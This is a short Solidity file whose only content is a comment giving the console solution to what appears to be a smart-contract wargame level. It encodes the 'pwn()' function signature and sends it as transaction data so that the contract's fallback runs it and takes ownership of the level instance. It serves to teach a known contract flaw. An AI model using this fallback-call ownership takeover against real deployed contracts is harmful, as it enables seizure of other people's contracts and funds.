// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

/* Solution in console

    First you're going to need to encode the name's function
    -let encodedFunction = web3.eth.abi.encodeFunctionSignature("pwn()")

    Then you're going to pass the encoded function as data in a transaction
    This way you're going to call the fallback function
    -await contract.sendTransaction({from: player, to: instance, data: encodedFunction})
*/